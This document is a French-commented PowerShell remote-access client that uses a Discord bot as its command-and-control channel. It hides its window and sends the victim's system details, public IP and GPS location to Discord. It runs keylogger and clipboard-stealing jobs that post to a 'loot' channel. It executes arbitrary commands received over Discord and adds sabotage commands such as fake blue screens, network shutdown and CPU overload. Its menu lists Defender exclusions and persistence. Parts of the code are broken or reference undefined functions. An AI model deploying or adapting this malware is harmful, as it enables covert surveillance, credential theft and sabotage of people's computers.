# DiscordC2CLIENT.ps1
# Version finale optimisée pour tests de cybersécurité sur machine personnelle
# Assurez-vous que le bot est uniquement dans UN serveur Discord

# Configuration
$global:token = "$tk" # Remplacer par votre jeton de bot
$HideConsole = 1 # Masquer la fenêtre de console (1 = masquer, 0 = afficher)
$spawnChannels = 1 # Créer de nouveaux canaux au démarrage
$InfoOnConnect = 1 # Envoyer les infos système au démarrage
$defaultstart = 1 # Lancer automatiquement tous les jobs
$global:parent = "https://is.gd/y92xe4"
# URL du script parent
$version = "2.2.0" # Numéro de version final
$timestamp = Get-Date -Format "dd/MM/yyyy @ HH:mm"

# Supprimer le stager de redémarrage s'il existe
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $InfoOnConnect = 0
    Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force
}

# Fonctions utilitaires
function Get-WebClient {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $global:token")
    $wc.Headers.Add("Content-Type", "application/json")
    return $wc
}

# Vérifier ou créer une catégorie Discord
function Get-OrCreateCategory {
    $wc = Get-WebClient
    $guilds = ($wc.DownloadString("https://discord.com/api/v10/users/@me/guilds") | ConvertFrom-Json)
    $guildID = $guilds[0].id
    $channels = ($wc.DownloadString("https://discord.com/api/guilds/$guildID/channels") | ConvertFrom-Json)
    
    $category = $channels | Where-Object { $_.type -eq 4 -and $_.name -eq $env:COMPUTERNAME }
    if ($category) {
        $global:CategoryID = $category.id
        Write-Host "Catégorie existante trouvée : $($category.id)"
        return
    }
    
    $body = @{
        "name" = "$env:COMPUTERNAME"
        "type" = 4
    } | ConvertTo-Json
    $response = $wc.UploadString("https://discord.com/api/guilds/$guildID/channels", "POST", $body)
    $responseObj = ConvertFrom-Json $response
    $global:CategoryID = $responseObj.id
    Write-Host "Nouvelle catégorie créée : $($responseObj.id)"
}

# Créer un nouveau canal
function New-Channel {
    param([string]$name, [int]$type = 0)
    $wc = Get-WebClient
    $guilds = ($wc.DownloadString("https://discord.com/api/v10/users/@me/guilds") | ConvertFrom-Json)
    $guildID = $guilds[0].id
    $body = @{
        "name" = $name
        "type" = $type
        "parent_id" = $global:CategoryID
    } | ConvertTo-Json
    $response = $wc.UploadString("https://discord.com/api/guilds/$guildID/channels", "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "Nouveau canal '$name' créé : $($responseObj.id)"
    return $responseObj.id
}

# Envoyer un message ou embed à Discord
function Send-Message {
    param([string]$Message, [hashtable]$Embed, [string]$ChannelID = $global:SessionID)
    $wc = Get-WebClient
    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
    $body = if ($Embed) {
        $Embed | ConvertTo-Json -Depth 10 -Compress
    } else {
        @{ "content" = $Message; "username" = $env:COMPUTERNAME } | ConvertTo-Json
    }
    try {
        $wc.UploadString($url, "POST", $body) | Out-Null
    } catch {
        Write-Host "Erreur lors de l'envoi du message : $_"
    }
}

# Télécharger et installer FFmpeg
function Get-FFmpeg {
    Send-Message -Message ":hourglass: ``Téléchargement de FFmpeg...`` :hourglass:"
    $path = "$env:Temp\ffmpeg.exe"
    if (-not (Test-Path $path)) {
        $wc = Get-WebClient
        $wc.Headers["User-Agent"] = "PowerShell"
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $release = ($wc.DownloadString($apiUrl) | ConvertFrom-Json)
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipPath = "$env:Temp\$($asset.name)"
        $extractDir = "$env:Temp\$($asset.name -replace '.zip$', '')"
        $wc.DownloadFile($zipUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath $env:Temp -Force
        Move-Item -Path "$extractDir\bin\ffmpeg.exe" -Destination $env:Temp -Force
        Remove-Item -Path $zipPath, $extractDir -Recurse -Force
    }
    Send-Message -Message ":white_check_mark: ``FFmpeg installé !`` :white_check_mark:"
}

# Collecter les informations système
function Get-QuickInfo {
    Add-Type -AssemblyName System.Windows.Forms, System.Device
    $geo = New-Object System.Device.Location.GeoCoordinateWatcher
    $geo.Start()
    while ($geo.Status -ne 'Ready' -and $geo.Permission -ne 'Denied') { Start-Sleep -Milliseconds 100 }
    $gps = if ($geo.Permission -eq 'Denied') { "Services de localisation désactivés" } else {
        $loc = $geo.Position.Location
        "LAT = $($loc.Latitude) LONG = $($loc.Longitude)"
    }
    $admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
    $systemInfo = Get-WmiObject Win32_OperatingSystem
    $processor = (Get-WmiObject Win32_Processor).Name
    $gpu = (Get-WmiObject Win32_VideoController).Name
    $ram = "{0:N1} GB" -f ((Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $embed = @{
        username = $env:COMPUTERNAME
        embeds = @(@{
            title = ":desktop: $env:COMPUTERNAME | Informations Système"
            description = "Informations système pour la session actuelle."
            fields = @(
                @{ name = "👤 Utilisateur"; value = "$env:USERNAME"; inline = $true }
                @{ name = "🛡️ Administrateur"; value = "$admin"; inline = $true }
                @{ name = "💻 Système"; value = "$($systemInfo.Caption) - $((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion)"; inline = $true }
                @{ name = "🏛️ Architecture"; value = "$($systemInfo.OSArchitecture)"; inline = $true }
                @{ name = "⚙️ Processeur"; value = "$processor"; inline = $true }
                @{ name = "🎮 GPU"; value = "$gpu"; inline = $true }
                @{ name = "🧠 RAM"; value = "$ram"; inline = $true }
                @{ name = "🖥️ Écran"; value = "$($screen.Width)x$($screen.Height)"; inline = $true }
                @{ name = "🌍 Localisation"; value = "$gps"; inline = $true }
                @{ name = "🌐 IP Publique"; value = (Invoke-WebRequest -Uri "ipinfo.io/ip" -UseBasicParsing).Content; inline = $true }
            )
            color = 0x00FF00
            footer = @{ text = $timestamp }
        })
    }
    Send-Message -Embed $embed
}

# Masquer la fenêtre de console
function Hide-Window {
    $async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $type = Add-Type -MemberDefinition $async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
        $type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $type::ShowWindowAsync($proc.MainWindowHandle, 0)
    }
}

# Surveiller les processus
function Monitor-Processes {
    param([string]$ChannelID = $global:LootID)
    Send-Message -Message ":mag_right: ``Surveillance des processus démarrée...`` :mag_right:" -ChannelID $ChannelID
    while ($true) {
        $processes = Get-Process | Select-Object Name, ID, CPU, WorkingSet64 | Sort-Object CPU -Descending | Select-Object -First 10
        $output = $processes | Format-Table -AutoSize | Out-String
        Send-Message -Message "``````$output``````" -ChannelID $ChannelID
        Start-Sleep -Seconds 60
    }
}

# Capturer le presse-papiers
function Capture-Clipboard {
    param([string]$ChannelID = $global:LootID)
    Send-Message -Message ":clipboard: ``Capture du presse-papiers démarrée...`` :clipboard:" -ChannelID $ChannelID
    $lastClipboard = ""
    while ($true) {
        $clipboard = Get-Clipboard
        if ($clipboard -ne $lastClipboard -and $clipboard) {
            Send-Message -Message ":clipboard: ``Presse-papiers mis à jour :`` ```$clipboard```" -ChannelID $ChannelID
            $lastClipboard = $clipboard
        }
        Start-Sleep -Seconds 10
    }
}

# Keylogger avancé
function Start-Keylogger {
    param([string]$ChannelID = $global:KeyID)
    Add-Type -AssemblyName System.Windows.Forms
    Send-Message -Message ":keyboard: ``Keylogger démarré...`` :keyboard:" -ChannelID $ChannelID
    $lastWindow = ""
    while ($true) {
        $currentWindow = [System.Windows.Forms.SystemInformation]::ActiveWindowTitle
        if ($currentWindow -ne $lastWindow) {
            Send-Message -Message ":window: ``Fenêtre active : $currentWindow``" -ChannelID $ChannelID
            $lastWindow = $currentWindow
        }
        $key = [System.Windows.Forms.Control]::IsKeyLocked
        if ($key) {
            $time = Get-Date -Format "HH:mm:ss"
            Send-Message -Message ":keyboard: ``[$time] Touche : $key``" -ChannelID $ChannelID
        }
        Start-Sleep -Milliseconds 100
    }
}

# Inondation de notifications
function Flood-Notifications {
    param([string]$ChannelID = $global:SessionID)
    Send-Message -Message ":bell: ``Inondation de notifications démarrée...`` :bell:" -ChannelID $ChannelID
    Add-Type -AssemblyName System.Windows.Forms
    $count = 0
    while ($count -lt 10) {
        [System.Windows.Forms.MessageBox]::Show("Alerte système !", "Erreur", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
        $count++
        Start-Sleep -Seconds 2
    }
    Send-Message -Message ":white_check_mark: ``Inondation terminée (10 notifications).`` :white_check_mark:" -ChannelID $ChannelID
}

# Simulation d'écran bleu (BSOD)
function Simulate-BSOD {
    param([string]$ChannelID = $global:SessionID)
    Send-Message -Message ":skull: ``Simulation d'écran bleu démarrée...`` :skull:" -ChannelID $ChannelID
    $code = @"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class BSOD {
    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
}
"@
$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$info = 0x1D
[BSOD]::NtSetInformationProcess($proc.Handle, 0x1D, [ref]$info, 4)
"@
    try {
        Invoke-Expression $code
    } catch {
        Send-Message -Message ":warning: ``Erreur lors de la simulation BSOD : $_`` :warning:" -ChannelID $ChannelID
    }
}

# Désactiver le réseau
function Disable-Network {
    param([string]$ChannelID = $global:SessionID)
    Send-Message -Message ":no_entry: ``Désactivation du réseau...`` :no_entry:" -ChannelID $ChannelID
    $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
    foreach ($adapter in $adapters) {
        Disable-NetAdapter -Name $adapter.Name -Confirm:$false
    }
    Send-Message -Message ":white_check_mark: ``Réseau désactivé.`` :white_check_mark:" -ChannelID $ChannelID
}

# Réactiver le réseau
function Enable-Network {
    param([string]$ChannelID = $global:SessionID)
    Send-Message -Message ":globe_with_meridians: ``Réactivation du réseau...`` :globe_with_meridians:" -ChannelID $ChannelID
    $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Disabled" }
    foreach ($adapter in $adapters) {
        Enable-NetAdapter -Name $adapter.Name -Confirm:$false
    }
    Send-Message -Message ":white_check_mark: ``Réseau réactivé.`` :white_check_mark:" -ChannelID $ChannelID
}

# Rotation de l'écran
function Rotate-Screen {
    param([string]$ChannelID = $global:SessionID)
    Send-Message -Message ":arrows_counterclockwise: ``Rotation de l'écran...`` :arrows_counterclockwise:" -ChannelID $ChannelID
    $angle = Get-Random -InputObject (0, 90, 180, 270)
    $code = @"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Display {
    [DllImport("user32.dll")]
    public static extern bool SetDisplayConfig(uint numPathArrayElements, IntPtr pathArray, uint numModeInfoArrayElements, IntPtr modeInfoArray, uint flags);
    [DllImport("user32.dll")]
    public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwflags, IntPtr lParam);
    [StructLayout(LayoutKind.Sequential)]
    public struct DEVMODE {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string dmDeviceName;
        public short dmSpecVersion;
        public short dmDriverVersion;
        public short dmSize;
        public short dmDriverExtra;
        public int dmFields;
        public int dmPositionX;
        public int dmPositionY;
        public int dmDisplayOrientation;
        public int dmDisplayFixedOutput;
        public short dmColor;
        public short dmDuplex;
        public short dmYResolution;
        public short dmTTOption;
        public short dmCollate;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string dmFormName;
        public short dmLogPixels;
        public int dmBitsPerPel;
        public int dmPelsWidth;
        public int dmPelsHeight;
        public int dmDisplayFlags;
        public int dmDisplayFrequency;
    }
}
"@
$devMode = New-Object Display+DEVMODE
$devMode.dmSize = [System.Runtime.InteropServices.Marshal]::SizeOf($devMode)
$devMode.dmDisplayOrientation = $angle / 90
[Display]::ChangeDisplaySettingsEx($null, [ref]$devMode, [IntPtr]::Zero, 0x8, [IntPtr]::Zero)
"@
    try {
        Invoke-Expression $code
        Send-Message -Message ":white_check_mark: ``Écran tourné à $angle degrés.`` :white_check_mark:" -ChannelID $ChannelID
    } catch {
        Send-Message -Message ":warning: ``Erreur lors de la rotation de l'écran : $_`` :warning:" -ChannelID $ChannelID
    }
}

# Surcharge du CPU
function Overload-CPU {
    param([string]$ChannelID = $global:SessionID)
    Send-Message -Message ":fire: ``Surcharge du CPU démarrée...`` :fire:" -ChannelID $ChannelID
    $job = Start-Job -ScriptBlock {
        while ($true) {
            $null = [System.Math]::Sqrt((Get-Random -Maximum 1000000))
        }
    }
    Start-Sleep -Seconds 30
    Stop-Job -Job $job
    Remove-Job -Job $job
    Send-Message -Message ":white_check_mark: ``Surcharge du CPU terminée.`` :white_check_mark:" -ChannelID $ChannelID
}

# Inversion des couleurs
function Invert-Colors {
    param([string]$ChannelID = $global:SessionID)
    Send-Message -Message ":art: ``Inversion des couleurs activée...`` :art:" -ChannelID $ChannelID
    $code = @"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Accessibility {
    [DllImport("user32.dll")]
    public static extern bool SetSysColors(int cElements, int[] lpaElements, int[] lpaRgbValues);
}
"@
$elements = @(1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30)
$colors = @(0xFFFFFF -band 0xFFFFFF) * $elements.Length
[Accessibility]::SetSysColors($elements.Length, $elements, $colors)
"@
    try {
        Invoke-Expression $code
        Send-Message -Message ":white_check_mark: ``Couleurs inversées.`` :white_check_mark:" -ChannelID $ChannelID
    } catch {
        Send-Message -Message ":warning: ``Erreur lors de l'inversion des couleurs : $_`` :warning:" -ChannelID $ChannelID
    }
}

# Commande Ping
function Run-Ping {
    param([string]$ChannelID = $global:SessionID, [string]$Target = "8.8.8.8")
    Send-Message -Message ":signal_strength: ``Lancement du ping vers $Target...`` :signal_strength:" -ChannelID $ChannelID
    $ping = Test-Connection -ComputerName $Target -Count 4 -ErrorAction SilentlyContinue
    if ($ping) {
        $results = $ping | ForEach-Object {
            "Temps: $($_.ResponseTime) ms, TTL: $($_.TimeToLive)"
        }
        $embed = @{
            username = $env:COMPUTERNAME
            embeds = @(@{
                title = ":signal_strength: Résultats du Ping vers $Target"
                description = "Résultats du test de connectivité réseau."
                fields = @(
                    @{ name = "Résultats"; value = "``````$($results -join "`n")``````"; inline = $false }
                )
                color = 0x00FF00
                footer = @{ text = $timestamp }
            })
        }
        Send-Message -Embed $embed -ChannelID $ChannelID
    } else {
        Send-Message -Message ":warning: ``Échec du ping vers $Target.`` :warning:" -ChannelID $ChannelID
    }
}

# Menu d'aide des commandes
function Options {
    $embed = @{
        username = $env:COMPUTERNAME
        embeds = @(@{
            title = ":gear: $env:COMPUTERNAME | Menu des Commandes"
            description = "Liste des commandes disponibles pour contrôler le client C2."
            fields = @(
                @{
                    name = "🛠️ Commandes Système"
                    value = "```" + @"
AddPersistance : Ajoute le script au démarrage pour la persistance.
RemovePersistance : Supprime le script du démarrage.
IsAdmin : Vérifie si la session a des privilèges administrateur.
Elevate : Tente de redémarrer le script en mode admin (déclenche l'UAC).
ExcludeCDrive : Exclut le disque C:\ des analyses de Windows Defender (admin requis).
ExcludeAllDrives : Exclut les disques C:\ à G:\ des analyses Defender (admin requis).
EnableIO : Active les entrées clavier et souris (admin requis).
DisableIO : Désactive les entrées clavier et souris (admin requis).
Exfiltrate : Collecte et envoie les fichiers spécifiés vers le canal loot-files.
Ping [cible] : Teste la connectivité réseau vers une adresse (par défaut 8.8.8.8).
"@
                }
                @{
                    name = "🔍 Commandes de Surveillance"
                    value = "```" + @"
MonitorProcesses : Surveille les 10 processus les plus gourmands en CPU (toutes les 60s).
CaptureClipboard : Capture les modifications du presse-papiers (toutes les 10s).
StartKeylogger : Enregistre les touches pressées avec le contexte de la fenêtre active.
"@
                }
                @{
                    name = "🎭 Commandes Nuisibles"
                    value = "```" + @"
FloodNotifications : Envoie 10 notifications Windows répétitives.
SimulateBSOD : Simule un écran bleu (BSOD) pour effrayer l'utilisateur.
DisableNetwork : Désactive temporairement tous les adaptateurs réseau.
EnableNetwork : Réactive tous les adaptateurs réseau désactivés.
RotateScreen : Tourne l'écran à un angle aléatoire (0, 90, 180, 270 degrés).
OverloadCPU : Surcharge le CPU pendant 30 secondes.
InvertColors : Active le mode contraste élevé pour inverser les couleurs.
"@
                }
                @{
                    name = "⚙️ Commandes de Contrôle"
                    value = "```" + @"
Close : Ferme la session et arrête le script.
Options : Affiche ce menu d'aide.
"@
                }
            )
            color = 0x1E90FF
            footer = @{ text = $timestamp }
        })
    }
    Send-Message -Embed $embed
}

# Boucle principale
if ($HideConsole -eq 1) { Hide-Window }
Get-OrCreateCategory
if ($spawnChannels -eq 1) {
    $global:SessionID = New-Channel -name 'controle-session'
    $global:ScreenshotID = New-Channel -name 'captures-ecran'
    $global:WebcamID = New-Channel -name 'webcam'
    $global:MicrophoneID = New-Channel -name 'microphone'
    $global:KeyID = New-Channel -name 'capture-touches'
    $global:LootID = New-Channel -name 'fichiers-loot'
    $global:PowershellID = New-Channel -name 'powershell'
}
Get-FFmpeg
if ($InfoOnConnect -eq 1) { Get-QuickInfo }
if ($defaultstart -eq 1) {
    Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
    Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID
    Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID
    Start-Job -ScriptBlock ${function:Start-Keylogger} -Name Keys -ArgumentList $global:KeyID
    Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
    Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
    Start-Job -ScriptBlock ${function:Monitor-Processes} -Name ProcessMonitor -ArgumentList $global:LootID
    Start-Job -ScriptBlock ${function:Capture-Clipboard} -Name Clipboard -ArgumentList $global:LootID
}
Send-Message -Message ":white_check_mark: ``$env:COMPUTERNAME Configuration terminée !`` :white_check_mark:"

# Boucle de traitement des commandes
$lastMessageId = $null
while ($true) {
    $wc = Get-WebClient
    $messages = ($wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages") | ConvertFrom-Json)[0]
    if ($messages.author.id -ne (Get-BotUserId) -and $messages.timestamp -ne $lastMessageId) {
        $lastMessageId = $messages.timestamp
        $command = $messages.content.ToLower()
        switch -Regex ($command) {
            "^ping\s*(\S*)$" {
                $target = if ($matches[1]) { $matches[1] } else { "8.8.8.8" }
                Run-Ping -Target $target
            }
            "monitorprocesses" {
                if (-not (Get-Job -Name ProcessMonitor -ErrorAction SilentlyContinue)) {
                    Start-Job -ScriptBlock ${function:Monitor-Processes} -Name ProcessMonitor -ArgumentList $global:LootID
                    Send-Message -Message ":mag_right: ``Surveillance des processus démarrée !`` :mag_right:"
                } else {
                    Send-Message -Message ":no_entry: ``Surveillance des processus déjà en cours !`` :no_entry:"
                }
            }
            "captureclipboard" {
                if (-not (Get-Job -Name Clipboard -ErrorAction SilentlyContinue)) {
                    Start-Job -ScriptBlock ${function:Capture-Clipboard} -Name Clipboard -ArgumentList $global:LootID
                    Send-Message -Message ":clipboard: ``Capture du presse-papiers démarrée !`` :clipboard:"
                } else {
                    Send-Message -Message ":no_entry: ``Capture du presse-papiers déjà en cours !`` :no_entry:"
                }
            }
            "startkeylogger" {
                if (-not (Get-Job -Name Keys -ErrorAction SilentlyContinue)) {
                    Start-Job -ScriptBlock ${function:Start-Keylogger} -Name Keys -ArgumentList $global:KeyID
                    Send-Message -Message ":keyboard: ``Keylogger démarré !`` :keyboard:"
                } else {
                    Send-Message -Message ":no_entry: ``Keylogger déjà en cours !`` :no_entry:"
                }
            }
            "floodnotifications" { Flood-Notifications }
            "simulatebsod" { Simulate-BSOD }
            "disablenetwork" { Disable-Network }
            "enablenetwork" { Enable-Network }
            "rotatescreen" { Rotate-Screen }
            "overloadcpu" { Overload-CPU }
            "invertcolors" { Invert-Colors }
            "options" { Options }
            "close" {
                Send-Message -Embed @{
                    username = $env:COMPUTERNAME
                    embeds = @(@{
                        title = ":no_entry: $env:COMPUTERNAME | Session Fermée"
                        description = ":no_entry: **$env:COMPUTERNAME** ferme la session."
                        color = 0xFF0000
                        footer = @{ text = $timestamp }
                    })
                }
                exit
            }
            default {
                try {
                    $output = Invoke-Expression $command -ErrorAction Stop
                    Send-Message -Message "``````$output``````"
                } catch {
                    Send-Message -Message ":warning: ``Erreur : $_`` :warning:"
                }
            }
        }
    }
    Start-Sleep -Seconds 3
}
